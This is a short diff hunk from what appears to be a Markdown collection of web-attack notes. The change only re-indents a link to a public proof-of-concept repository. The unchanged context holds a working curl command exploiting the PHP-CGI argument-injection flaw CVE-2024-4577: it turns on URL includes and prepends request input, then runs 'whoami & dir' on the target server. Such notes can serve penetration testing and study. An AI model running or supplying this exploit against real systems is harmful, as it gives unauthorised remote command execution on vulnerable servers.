@@ -177,10 +177,10 @@
       ```sh
       curl -o - "URL/php-cgi/php-cgi.exe?%ADd+cgi.force_redirect%3d0+%ADd+cgi.redirect_status_env+%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input" --data '<?=`whoami & dir`;die();?>'
       ```
-      - PoC
-        ```sh
-        https://github.com/watchtowrlabs/CVE-2024-4577
-        ```
+  - PoC
+      ```sh
+      https://github.com/watchtowrlabs/CVE-2024-4577
+      ```
 ## LFI
 
 ## RF&一堆教材文件
